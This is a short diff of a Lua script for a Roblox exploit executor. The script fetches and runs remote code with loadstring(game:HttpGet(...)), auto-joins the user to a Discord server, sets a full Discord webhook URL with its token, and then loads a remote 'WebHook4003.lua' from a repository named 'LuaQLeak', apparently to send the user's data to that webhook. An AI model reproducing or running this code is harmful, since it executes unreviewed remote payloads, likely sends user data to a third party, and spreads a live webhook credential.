@@ -1,2 +1,10 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
 
+Module.Prompt({ invite = "https://discord.gg/jTDQw2E3", name = "(SA)" })
+
+Module.Join("https://discord.gg/jTDQw2E3")
+
+
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
